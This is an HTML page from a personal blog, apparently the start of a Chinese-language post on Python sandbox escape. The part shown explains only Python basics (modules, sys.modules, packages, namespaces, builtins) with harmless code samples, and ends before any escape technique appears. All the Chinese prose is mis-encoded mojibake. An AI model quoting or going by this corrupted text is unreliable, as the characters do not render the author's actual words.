<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/08/12/python æ²™ç®±é€ƒé€¸/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Python æ²™ç®±é€ƒé€¸ | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"æ¨èé˜…è¯»","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["ä¹¦æœ‰æœªæ›¾ç»æˆ‘è¯»ï¼Œäº‹æ— ä¸å¯å¯¹äººè¨€"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"åˆ†ç±»":{"icon":"fa-solid fa-folder","path":"/categories/"},"æ ‡ç­¾":{"icon":"fa-solid fa-tags","path":"/tags/"},"ä¹¦ç­¾":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    åˆ†ç±»
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    æ ‡ç­¾
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    ä¹¦ç­¾
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                åˆ†ç±»
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                æ ‡ç­¾
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                ä¹¦ç­¾
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">57</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Python æ²™ç®±é€ƒé€¸</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-08-12 00:01:08</span>
        <span class="mobile">2025-08-12 00:01:08</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-08-19 01:12:40</span>
            <span class="mobile">2025-08-19 01:12:40</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/python-web/">python web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/python-web/">python web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>31.5k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>139 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="Python-åŸºç¡€çŸ¥è¯†"><a href="#Python-åŸºç¡€çŸ¥è¯†" class="headerlink" title="Python åŸºç¡€çŸ¥è¯†"></a>Python åŸºç¡€çŸ¥è¯†</h1><h2 id="Python-ç¨‹åºç»“æ„"><a href="#Python-ç¨‹åºç»“æ„" class="headerlink" title="Python ç¨‹åºç»“æ„"></a>Python ç¨‹åºç»“æ„</h2><h3 id="æ¨¡å—ï¼ˆModuleï¼‰"><a href="#æ¨¡å—ï¼ˆModuleï¼‰" class="headerlink" title="æ¨¡å—ï¼ˆModuleï¼‰"></a>æ¨¡å—ï¼ˆModuleï¼‰</h3><p>åœ¨ Python ä¸­<strong>æ¨¡å—ï¼ˆModuleï¼‰</strong>å°±æ˜¯ä¸€ä¸ª <code>.py</code> æ–‡ä»¶ã€‚å½“ä½  <code>import</code> å®ƒæ—¶ï¼ŒPython ä¼š<strong>å…ˆè¿è¡Œä¸€æ¬¡</strong>è¿™ä¸ªæ–‡ä»¶é‡Œçš„ä»£ç ï¼Œç„¶åæŠŠè¿è¡Œç»“æœæ‰“åŒ…æˆä¸€ä¸ª<strong>æ¨¡å—å¯¹è±¡</strong>ã€‚è¿™ä¸ªæ¨¡å—å¯¹è±¡é‡Œä¿å­˜äº†ä½ åœ¨æ–‡ä»¶é‡Œå®šä¹‰çš„å˜é‡ã€å‡½æ•°å’Œç±»ï¼Œè¿™ä¸ªä¿å­˜ç©ºé—´å°±æ˜¯å®ƒçš„<strong>å‘½åç©ºé—´</strong>ï¼ˆå…¶å®å°±æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œé”®æ˜¯åå­—ï¼Œå€¼æ˜¯å¯¹è±¡ï¼‰ã€‚</p>
<p>Python ä¼šæŠŠè¿™ä¸ªæ¨¡å—å¯¹è±¡<strong>å­˜åˆ°ä¸€ä¸ªå…¨å±€å­—å…¸ <code>sys.modules</code> é‡Œ</strong>ï¼Œä¸‹æ¬¡ä½ å†å¯¼å…¥åŒåæ¨¡å—ï¼Œå°±ç›´æ¥ä»è¿™ä¸ªå­—å…¸é‡Œæ‹¿ç°æˆçš„ï¼Œä¸ä¼šå†è¿è¡Œä¸€æ¬¡æ–‡ä»¶é‡Œçš„ä»£ç ã€‚å…·ä½“è¿‡ç¨‹ä¸ºï¼š</p>
<ol>
<li>å…ˆæ£€æŸ¥å…¨å±€å­—å…¸ <strong><code>sys.modules</code></strong> æœ‰æ²¡æœ‰è¿™ä¸ªæ¨¡å—å¯¹è±¡<ul>
<li>æœ‰ â†’ ç›´æ¥è¿”å›ï¼Œ<strong>ä¸ä¼š</strong>é‡å¤è¿è¡Œæ–‡ä»¶é‡Œçš„ä»£ç </li>
<li>æ²¡æœ‰ â†’ æ‰§è¡Œä¸‹ä¸€æ­¥</li>
</ul>
</li>
<li>åˆ›å»ºä¸€ä¸ªæ–°çš„<strong>æ¨¡å—å¯¹è±¡</strong>ï¼ˆ<code>&lt;class &#39;module&#39;&gt;</code>ï¼‰</li>
<li>æŠŠæ¨¡å—å¯¹è±¡æ’å…¥åˆ° <code>sys.modules</code>ï¼Œé”®æ˜¯æ¨¡å—å</li>
<li><strong>æ‰§è¡Œæ¨¡å—æ–‡ä»¶é‡Œçš„ä»£ç </strong>ï¼ŒæŠŠé¡¶å±‚å®šä¹‰çš„åå­—ï¼ˆå˜é‡ã€å‡½æ•°ã€ç±»ç­‰ï¼‰æ”¾è¿›æ¨¡å—å¯¹è±¡çš„ <code>__dict__</code>ï¼ˆå‘½åç©ºé—´ï¼‰</li>
</ol>
<p>å…¶ä¸­ <code>__main__</code> æ¨¡å—æ˜¯ Python è¿è¡Œæ—¶çš„ç¬¬ä¸€ä¸ªæ¨¡å—ï¼Œå› æ­¤åœ¨ä»»ä½• Python ç¨‹åºä¸­ï¼Œ<code>sys.modules[&quot;__main__&quot;]</code> éƒ½æŒ‡å‘å½“å‰<strong>å…¥å£æ¨¡å—</strong>ï¼Œä¹Ÿå°±æ˜¯è¿è¡Œç¯å¢ƒçš„å…¨å±€ä½œç”¨åŸŸã€‚</p>
<ul>
<li><code>__name__</code>ï¼šæ¨¡å—å…¨åï¼›è„šæœ¬ç›´è·‘æ—¶ä¸º <code>&quot;__main__&quot;</code></li>
<li><code>__file__</code>ï¼šæºæ–‡ä»¶è·¯å¾„ï¼ˆå†…ç½®æ¨¡å—å¯èƒ½æ²¡æœ‰ï¼‰</li>
<li><code>__spec__</code>ï¼šå¯¼å…¥è§„èŒƒå¯¹è±¡ï¼Œæè¿°å¦‚ä½•åŠ è½½ï¼ˆPEP 451ï¼‰</li>
<li><code>__package__</code>ï¼šåŒ…åï¼ˆå†³å®šç›¸å¯¹å¯¼å…¥åŸºå‡†ï¼‰</li>
<li><code>__loader__</code>ï¼šåŠ è½½å™¨å¯¹è±¡</li>
<li><code>__cached__</code>ï¼šå¯¹åº” <code>.pyc</code> è·¯å¾„</li>
</ul>
<h3 id="åŒ…ï¼ˆPackageï¼‰"><a href="#åŒ…ï¼ˆPackageï¼‰" class="headerlink" title="åŒ…ï¼ˆPackageï¼‰"></a>åŒ…ï¼ˆPackageï¼‰</h3><p><strong>åŒ…ï¼ˆPackageï¼‰</strong>æ˜¯åŒ…å« <code>__init__.py</code> æ–‡ä»¶çš„ç›®å½•ï¼Œç”¨äºå°†å¤šä¸ªæ¨¡å—æŒ‰å±‚æ¬¡ç»“æ„ç»„ç»‡èµ·æ¥ã€‚åŒ…çš„ä½œç”¨æ˜¯<strong>æŠŠå¤šä¸ªæ¨¡å—æŒ‰å±‚æ¬¡ç»“æ„ç»„ç»‡èµ·æ¥</strong>ï¼Œå°±åƒæ–‡ä»¶å¤¹ç®¡ç†æ–‡ä»¶ä¸€æ ·ã€‚</p>
<p>æŠ€æœ¯ä¸Šï¼Œ<strong>åŒ…ä¹Ÿæ˜¯ <code>&lt;class &#39;module&#39;&gt;</code> å¯¹è±¡</strong>ã€‚åŒ…å’Œæ¨¡å—å”¯ä¸€åŒºåˆ«æ˜¯ï¼šæ™®é€šæ¨¡å—æ¥æºæ˜¯ä¸€ä¸ª <code>.py</code> æ–‡ä»¶ï¼›åŒ…æ¥æºæ˜¯ä¸€ä¸ª **ç›®å½• + <code>__init__.py</code>**ã€‚</p>
<p>å¦å¤–åŒ…é‡Œé¢æ—¢å¯ä»¥åŒ…å«<strong>æ¨¡å—</strong>è¿˜å¯ä»¥åŒ…å«<strong>å…¶ä»–çš„åŒ…</strong>ã€‚åœ¨åŒ…å¯¹åº”çš„ç›®å½•ä¸‹ï¼š</p>
<ul>
<li><p><code>.py</code> æ–‡ä»¶ â†’ å­æ¨¡å—</p>
</li>
<li><p>ç›®å½•ï¼ˆå« <code>__init__.py</code>ï¼‰â†’ å­åŒ…</p>
</li>
</ul>
<p>å¯¼å…¥æ—¶ï¼Œè¿™äº›å­æ¨¡å— &#x2F; å­åŒ…ä¼šè¢«åŠ è½½ä¸ºæ¨¡å—å¯¹è±¡ï¼Œå¹¶<strong>æ”¾è¿›æ‰€åœ¨åŒ…çš„å‘½åç©ºé—´é‡Œ</strong>ã€‚ä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mypkg.subpkg.mod</span><br></pre></td></tr></table></figure></div>

<p>ä¼šè®©ï¼š</p>
<ul>
<li><code>mypkg.__dict__[&#39;subpkg&#39;]</code> ä¿å­˜ <code>&lt;module &#39;mypkg.subpkg&#39;&gt;</code></li>
<li><code>mypkg.subpkg.__dict__[&#39;mod&#39;]</code> ä¿å­˜ <code>&lt;module &#39;mypkg.subpkg.mod&#39;&gt;</code></li>
</ul>
<h3 id="å‘½åç©ºé—´ï¼ˆNamespaceï¼‰"><a href="#å‘½åç©ºé—´ï¼ˆNamespaceï¼‰" class="headerlink" title="å‘½åç©ºé—´ï¼ˆNamespaceï¼‰"></a>å‘½åç©ºé—´ï¼ˆNamespaceï¼‰</h3><p><strong>å‘½åç©ºé—´ï¼ˆNamespaceï¼‰</strong>å°±æ˜¯<strong>åå­—åˆ°å¯¹è±¡çš„æ˜ å°„å…³ç³»</strong>ï¼Œæœ¬è´¨æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œç”¨æ¥å­˜æ”¾â€œæŸä¸ªåå­—å½“å‰æŒ‡å‘å“ªä¸ªå¯¹è±¡â€çš„ä¿¡æ¯ã€‚</p>
<p>Python ä¸­å‡ ä¹æ‰€æœ‰ä¸œè¥¿ï¼ˆå˜é‡ã€å‡½æ•°ã€ç±»ã€æ¨¡å—ã€åŒ…ï¼‰éƒ½æ˜¯å¯¹è±¡ï¼Œå‘½åç©ºé—´å°±æ˜¯è¿™äº›åå­—çš„å­˜æ”¾ä½ç½®ã€‚</p>
<p>å¸¸è§çš„å‡ ç±»å‘½åç©ºé—´ï¼š</p>
<ul>
<li><strong>å±€éƒ¨å‘½åç©ºé—´ï¼ˆLocalï¼‰</strong>ï¼šå‡½æ•°æˆ–æ–¹æ³•å†…éƒ¨å®šä¹‰çš„åå­—ï¼ˆå‚æ•°ã€å±€éƒ¨å˜é‡ç­‰ï¼‰ã€‚</li>
<li><strong>é—­åŒ…å‘½åç©ºé—´ï¼ˆEnclosingï¼‰</strong>ï¼šåµŒå¥—å‡½æ•°çš„å¤–å±‚å‡½æ•°ä½œç”¨åŸŸã€‚</li>
<li><strong>å…¨å±€å‘½åç©ºé—´ï¼ˆGlobalï¼‰</strong>ï¼šä¸€ä¸ªæ¨¡å—æ–‡ä»¶é¡¶å±‚å®šä¹‰çš„åå­—ï¼ˆæ¨¡å—çº§å˜é‡ã€å‡½æ•°ã€ç±»ç­‰ï¼‰ã€‚</li>
<li><strong>å†…ç½®å‘½åç©ºé—´ï¼ˆBuiltinsï¼‰</strong>ï¼šPython å¯åŠ¨æ—¶åŠ è½½çš„å†…ç½®åå­—ï¼ˆ<code>len</code>ã€<code>print</code>ã€<code>Exception</code> ç­‰ï¼‰ã€‚</li>
</ul>
<p>å˜é‡æŸ¥æ‰¾éµå¾ª <strong>LEGB</strong>ï¼ˆ <strong>L</strong>ocal â†’ <strong>E</strong>nclosing â†’ <strong>G</strong>lobal â†’ <strong>B</strong>uiltinsï¼‰ é¡ºåºï¼Œæ‰¾ä¸åˆ°å°±æŠ› <code>NameError</code>ï¼Œ<strong>ä¿è¯äº†ä¸åŒä½œç”¨åŸŸçš„å˜é‡äº’ä¸å†²çª</strong>ã€‚</p>
<p>åœ¨ Python ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>globals()</code> å’Œ <code>locals()</code> å‡½æ•°åˆ†åˆ«è·å–<strong>å½“å‰æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´</strong>å’Œ<strong>å½“å‰ä½œç”¨åŸŸçš„å±€éƒ¨å‘½åç©ºé—´</strong>ï¼Œå¦å¤–æ¨¡å—çš„ <code>__dict__</code> å±æ€§è¡¨ç¤ºçš„æ˜¯æ¨¡å—çš„å‘½åç©ºé—´ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">globals</span>())      <span class="comment"># å½“å‰æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>())       <span class="comment"># å½“å‰ä½œç”¨åŸŸçš„å±€éƒ¨å‘½åç©ºé—´</span></span><br><span class="line"><span class="built_in">print</span>(math.__dict__)  <span class="comment"># math æ¨¡å—çš„å‘½åç©ºé—´</span></span><br></pre></td></tr></table></figure></div>

<h2 id="builtins-æ¨¡å—"><a href="#builtins-æ¨¡å—" class="headerlink" title="builtins æ¨¡å—"></a>builtins æ¨¡å—</h2><h3 id="ä»€ä¹ˆæ˜¯-builtinsï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-builtinsï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ builtinsï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ builtinsï¼Ÿ</h3><p>åœ¨ Python ä¸­ï¼Œæœ‰ä¸€ç»„åŠŸèƒ½æ˜¯<strong>é»˜è®¤å°±å¯ä»¥ç”¨çš„</strong>ï¼Œæ¯”å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="built_in">len</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="built_in">int</span>(<span class="string">&quot;123&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>è¿™äº›å‡½æ•°æˆ‘ä»¬<strong>ä»æ¥æ²¡å¯¼å…¥è¿‡</strong>ï¼Œå°±å¯ä»¥ç›´æ¥ç”¨ã€‚å…¶å®å®ƒä»¬éƒ½æ¥è‡ªäºä¸€ä¸ªå« <code>builtins</code> çš„æ¨¡å—ã€‚</p>
<p><strong><code>builtins</code> æ˜¯ Python è§£é‡Šå™¨è‡ªåŠ¨å¯¼å…¥çš„æ¨¡å—ï¼ŒåŒ…å«äº† Python æ‰€æœ‰çš„å†…ç½®å‡½æ•°ã€ç±»å‹ã€å¼‚å¸¸ã€å¸¸é‡ç­‰ã€‚</strong></p>
<p>ä½ å¯ä»¥è¿™æ ·è®¿é—®å®ƒï¼š</p>
